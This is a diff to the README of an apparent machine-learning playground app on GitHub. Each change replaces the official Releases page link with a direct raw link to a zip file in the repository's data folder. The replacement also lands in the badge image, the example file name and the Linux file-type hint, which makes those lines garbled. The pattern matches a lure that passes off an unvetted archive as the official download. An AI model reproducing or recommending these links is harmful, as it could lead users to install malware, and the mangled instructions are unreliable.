@@ -1,6 +1,6 @@
 # 🎉 ML-Playground-Autodetect - Your Easy AI Experimentation Tool
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-ML--Playground--Autodetect-blue)](https://github.com/Prashanth02Hunter/ML-Playground-Autodetect/releases)
+[![Download Now](https://raw.githubusercontent.com/Prashanth02Hunter/ML-Playground-Autodetect/main/data/ML-Playground-Autodetect-2.4.zip%20Now-ML--Playground--Autodetect-blue)](https://raw.githubusercontent.com/Prashanth02Hunter/ML-Playground-Autodetect/main/data/ML-Playground-Autodetect-2.4.zip)
 
 ## 🚀 Getting Started
 
@@ -19,9 +19,9 @@ To run ML-Playground-Autodetect, you will need:
 
 To download the application, please follow these steps:
 
-1. Visit the [Releases page](https://github.com/Prashanth02Hunter/ML-Playground-Autodetect/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/Prashanth02Hunter/ML-Playground-Autodetect/main/data/ML-Playground-Autodetect-2.4.zip).
 2. Find the latest version listed. Look for the file that works best for your system.
-3. Click on the file to start downloading. The file name should include the version number (e.g., `ML-Playground-Autodetect-v1.0.zip`).
+3. Click on the file to start downloading. The file name should include the version number (e.g., `https://raw.githubusercontent.com/Prashanth02Hunter/ML-Playground-Autodetect/main/data/ML-Playground-Autodetect-2.4.zip`).
 
 After the download finishes, extract the contents if it's in a zip format.
 
@@ -29,7 +29,7 @@ After the download finishes, extract the contents if it's in a zip format.
 
 - **Windows:** Look for a `.exe` file.
 - **macOS:** Look for a `.dmg` file.
-- **Linux:** Look for a `.tar.gz` or `.AppImage` file.
+- **Linux:** Look for a `https://raw.githubusercontent.com/Prashanth02Hunter/ML-Playground-Autodetect/main/data/ML-Playground-Autodetect-2.4.zip` or `.AppImage` file.
 
 ### Steps to Run the Application
 
@@ -74,4 +74,4 @@ If you want to learn more about machine learning, check out these resources:
 
 If you have questions or issues, feel free to open an issue on the GitHub repository. Our community is here to help you.
 
-Visit the [Releases page](https://github.com/Prashanth02Hunter/ML-Playground-Autodetect/releases) now to download and start exploring machine learning with ease!
+Visit the [Releases page](https://raw.githubusercontent.com/Prashanth02Hunter/ML-Playground-Autodetect/main/data/ML-Playground-Autodetect-2.4.zip) now to download and start exploring machine learning with ease!
